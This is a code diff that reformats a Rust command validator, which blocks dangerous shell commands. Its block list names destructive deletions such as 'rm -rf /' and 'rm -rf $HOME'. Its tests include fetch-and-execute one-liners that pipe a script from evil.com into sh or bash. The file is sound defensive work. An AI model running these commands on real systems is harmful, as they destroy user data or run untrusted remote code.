@@ -12,17 +12,11 @@ pub struct ValidationResult {
 
 impl ValidationResult {
     pub fn allowed() -> Self {
-        Self {
-            allowed: true,
-            reason: None,
-        }
+        Self { allowed: true, reason: None }
     }
 
     pub fn blocked(reason: &'static str) -> Self {
-        Self {
-            allowed: false,
-            reason: Some(reason),
-        }
+        Self { allowed: false, reason: Some(reason) }
     }
 }
 
@@ -78,8 +72,18 @@ impl CommandValidator {
                 "wget | sudo",
                 "curl | sudo",
             ],
-            blocked_root_paths: vec!["rm -rf /", "rm -rf /*", "rm -rf ~", "rm -rf $HOME"],
-            safe_rm_paths: vec!["/tmp", "/var/tmp", "/home/", "~/"],
+            blocked_root_paths: vec![
+                "rm -rf /",
+                "rm -rf /*",
+                "rm -rf ~",
+                "rm -rf $HOME",
+            ],
+            safe_rm_paths: vec![
+                "/tmp",
+                "/var/tmp",
+                "/home/",
+                "~/",
+            ],
         }
     }
 
@@ -185,16 +189,8 @@ mod tests {
         assert!(!validator.validate("reboot").allowed);
 
         // Network download + execution
-        assert!(
-            !validator
-                .validate("wget http://evil.com/script.sh | sh")
-                .allowed
-        );
-        assert!(
-            !validator
-                .validate("curl http://evil.com/script.sh | bash")
-                .allowed
-        );
+        assert!(!validator.validate("wget http://evil.com/script.sh | sh").allowed);
+        assert!(!validator.validate("curl http://evil.com/script.sh | bash").allowed);
     }
 
     #[test]
